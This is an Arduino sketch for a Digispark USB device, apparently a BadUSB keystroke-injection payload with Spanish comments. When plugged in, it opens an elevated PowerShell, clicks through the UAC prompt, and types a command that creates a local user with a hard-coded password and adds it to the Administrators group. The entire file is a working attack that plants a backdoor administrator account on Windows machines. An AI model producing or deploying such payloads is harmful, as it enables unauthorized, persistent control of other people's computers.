#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Crea un nuevo usuario local y lo agrega al grupo Administradores
  DigiKeyboard.print(F("$pass = ConvertTo-SecureString \"contra1.\" -AsPlainText -Force; New-LocalUser \"accName\" -Password $pass; Add-LocalGroupMember -Group \"Administradores\" -Member \"accName\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("exit"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {
  // No hace nada en el loop
}

